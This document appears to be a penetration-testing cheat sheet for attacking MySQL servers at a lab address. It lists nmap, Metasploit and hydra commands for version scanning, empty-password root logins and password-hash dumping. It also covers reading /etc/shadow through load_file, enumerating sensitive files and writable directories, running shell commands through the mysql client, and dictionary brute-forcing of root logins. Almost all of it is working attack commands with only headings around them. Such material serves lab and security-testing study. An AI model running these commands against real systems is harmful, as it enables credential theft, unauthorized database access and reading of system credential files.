# Enumeration
#### Version
````bash
# Nmap
nmap -p 3306 -sV 10.0.2.15

# Metasploit
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 10.0.2.15
run
````

#### Mysql 
````bash
# Connet
mysql -h 10.0.2.15 -u root

# Use database
use database_name

# Show databases
show databases;

# Show tables
show tables;

# Show Columns from table 
SHOW COLUMNS FROM table_name;

# Show content from table
SELECT * FROM table_name;

# Command
mysql -h 10.0.2.5 -u root -p
\! whoami

# Records are present in table
select count(*) from authors;

#hash root
mysql -h 10.0.2.15 -u root
select load_file("/etc/shadow");
````
#### Nmap
````bash
# show databases
nmap --script=mysql-databases --script-args="mysqluser='root',password''" -p 3306 10.0.2.15

# Records are present in table
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 10.0.2.15

# anonymous login
nmap --script=mysql-empty-password -p 3306 10.0.2.15

# Enumerate users
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 10.0.2.15

# Directory used by mysql server
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 10.0.2.15

# Dump hashes
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 10.0.2.15
````
#### Metasploit Modules
````bash
# Version
use auxiliary/scanner/mysql/mysql_version

# Brute force
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Dump the schema of all databases
use auxiliary/scanner/mysql/mysql_schemadump

# Directories writables
use auxiliary/scanner/mysql/mysql_writable_dirs

# File enum
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

# Hashdump
use auxiliary/scanner/mysql/mysql_hashdump
````
# MySQL Dictionary Attack
````bash
# hydra
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.2.15 mysql

# Metasploit
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
set RHOSTS 10.0.2.15
exploit
````